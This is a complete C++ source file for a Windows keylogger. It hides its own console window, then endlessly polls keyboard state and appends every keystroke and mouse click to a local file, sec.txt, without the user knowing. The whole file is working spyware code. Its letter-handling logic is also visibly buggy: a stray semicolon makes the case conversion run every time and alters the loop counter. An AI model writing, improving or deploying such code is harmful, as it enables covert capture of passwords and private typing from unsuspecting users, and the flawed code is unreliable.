#include<bits/stdc++.h>
#include<iostream>
#include<windows.h>
#include<winuser.h>
#include<fstream>
using namespace std ;

void hide ()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}

void logging()
{
    char x ;
    while(1)
    {
        for(x=8;x<=222;++x)
        {

            if(GetAsyncKeyState(x)==-32767)
            {
                ofstream log("sec.txt",ios::app);


                switch(x)
                {


                case VK_BACK :
                    log<<"[BACKSPACE]";
                    break;
                case VK_RETURN:
                    log<<"[ENTER]";
                    break;
                case VK_SHIFT:
                    log<<"[SHIFT]";
                    break;
                 case VK_CONTROL:
                    log<<"[CONTROL]";
                    break;
                case VK_CAPITAL:
                    log<<"[CAPITAL]";
                    break;
                case VK_TAB:
                    log<<"[TAB]";
                    break;

                case VK_MENU:
                    log<<"[ALT]";
                    break;
                case VK_RBUTTON:
                    log<<"[RIGHT_CLICK]";
                    break;
                  case VK_LBUTTON:
                    log<<"[LEFT_CLICK]";
                    break;
                  default:
                      if((x>64&&x<91)&&!(GetAsyncKeyState(0x10)));
                      {
                          x+=32;
                          log<<x;
                      }
                     if (x>64&&x<91)
                      {
                          log<<x;
                      }

                      //  log<<x;


                }
                log.close();
            }

           // wr<<c;
        }
    }
}

int main() {

    hide();
    logging();

    return 0;
}
